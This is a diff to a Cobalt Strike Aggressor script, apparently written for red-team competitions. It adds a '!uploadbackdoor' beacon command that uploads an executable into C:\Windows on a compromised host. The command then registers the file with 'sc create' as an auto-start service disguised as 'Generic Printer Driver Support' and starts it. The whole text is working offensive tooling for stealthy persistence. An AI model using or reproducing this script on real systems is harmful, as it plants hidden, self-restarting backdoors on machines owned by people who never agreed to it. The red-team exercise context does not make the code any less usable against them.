@@ -3,7 +3,7 @@
 # Export a Windows Service EXE file
 # Save the exe, something like "GenericPrinterServices.exe" works
 # Inspired by: http://blog.cobaltstrike.com/2016/02/23/cobalt-strike-tips-for-2016-ccdc-red-teams/
-# Load the script, then in the script console, execute with !uploadbackdoor $BEACON_ID $FULL_LOCAL_PATH_TO_SERVICE_EXE
+# Load the script, then in the script console, execute with !uploadbackdoor $FULL_LOCAL_PATH_TO_SERVICE_EXE
 # Und3rf10w
 
 sub servicefilename {
@@ -11,15 +11,21 @@ sub servicefilename {
 	$servicebackdoorfilename = $servicebackdoorfilename[0];
 }
 
-command !uploadbackdoor {
+alias !uploadbackdoor {
 	println("\c4Uploading backdoor on beacon $1 using file $2 ");
-	binput($1, "Attempting to publish backdoor service");
+	blog($1, "Attempting to publish backdoor service");
 	bcd($1, "C:\\Windows\\");
 	println("\c4Changed directory on beacon $1 to C:\\Windows\\");
 	bupload($1, script_resource("$2"));
 	servicefilename($2);
 	bshell($1, "sc create GenericPrinterDriver binPath= \"C:\\Windows\\ $+ $servicebackdoorfilename $+ \" start= auto DisplayName= \"Generic Printer Driver Support\"");
 	bshell($1, "sc start GenericPrinterDriver");
-	binput ($1, "Backdoor service created using $servicebackdoorfilename ");
+	blog($1, "Backdoor service created using $servicebackdoorfilename ");
 	println("\c9[+] Backdoor creation complete!");
+}
+
+beacon_command_register {
+	"!uploadbackdoor",
+	"Uploads and creates a persistent backdoor to the beacon",
+	"Synopsis: !uploadbackdoor [path to local service exe on your system]"
 }
